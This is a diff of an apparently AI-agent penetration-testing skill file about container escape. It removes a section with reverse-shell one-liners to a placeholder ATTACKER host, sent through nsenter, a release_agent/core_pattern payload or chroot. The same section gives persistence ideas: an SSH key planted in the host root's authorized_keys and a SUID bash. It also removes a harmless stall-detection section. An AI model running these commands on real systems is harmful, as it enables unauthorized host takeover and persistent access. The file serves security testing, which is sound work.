@@ -910,37 +910,6 @@ cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token 2>/dev/null
 
 Successfully accessed host filesystem or got a host shell.
 
-#### Reverse Shell via MCP
-
-When a container escape achieves host-level access, **catch the host shell via
-the MCP shell-server** rather than relying on `nsenter` or `chroot` in the
-current terminal. Container escapes often produce shells in different
-namespaces or via asynchronous triggers (release_agent, core_pattern) that the
-agent cannot interact with directly.
-
-1. Call `start_listener(port=4444)` to prepare a catcher on the attackbox
-2. Send a reverse shell from the host context:
-   ```bash
-   # After nsenter to host namespace:
-   nsenter -t 1 -m -u -i -n -p -- bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
-   # Or in release_agent / core_pattern payload:
-   echo '#!/bin/sh
-   bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' > /cmd
-   # Or after mounting host filesystem:
-   chroot /mnt/host bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
-   ```
-3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
-4. Verify host-level access with `send_command(session_id=..., command="hostname && cat /etc/hostname")`
-
-If the host lacks outbound connectivity, write an SSH key to
-`/mnt/host/root/.ssh/authorized_keys` and connect from the attackbox, or
-create a SUID bash on the host filesystem and access it from the container.
-
-→ **Route to linux-discovery** (Linux host) or **windows-discovery** (Windows host)
-   for local privilege escalation.
-→ **Route to network-recon** to discover additional targets from the host's
-   network position.
-
 ### Found K8s Cluster Admin
 
 Service account has cluster-admin or equivalent permissions.
@@ -968,41 +937,6 @@ Container is properly hardened (no caps, no mounts, read-only rootfs).
 → Check for network access to other services (databases, internal APIs)
 → Check cloud metadata access (Step 12)
 → Report the container as hardened in the engagement state Blocked section
-
-## Stall Detection
-
-If you have spent **5 or more tool-calling rounds** on the same failure with
-no meaningful progress — same error, no new information, no change in output
-— **stop**.
-
-**What counts as progress:**
-- Trying a variant or alternative **documented in this skill**
-- Adjusting syntax, flags, or parameters per the Troubleshooting section
-- Gaining new diagnostic information (different error, partial success)
-
-**What does NOT count as progress:**
-- Writing custom exploit code not provided in this skill
-- Inventing workarounds using techniques from other domains
-- Retrying the same command with trivially different input
-- Compiling or transferring tools not mentioned in this skill
-
-If you find yourself writing code that isn't in this skill, you have left
-methodology. That is a stall.
-
-Do not loop. Work through failures systematically:
-1. Try each variant or alternative **once**
-2. Check the Troubleshooting section for known fixes
-3. If nothing works after 5 rounds, you are stalled
-
-**When stalled, return to the orchestrator immediately with:**
-- What was attempted (commands, variants, alternatives tried)
-- What failed and why (error messages, empty responses, timeouts)
-- Assessment: **blocked** (permanent — config, patched, missing prereq) or
-  **retry-later** (may work with different context, creds, or access)
-
-**When stalled:** Tell the user you're stalled, present what was tried, and
-recommend the next best path. Return findings to the orchestrator — it will
-decide whether to revisit with new context or route elsewhere.
 
 ## Troubleshooting
 
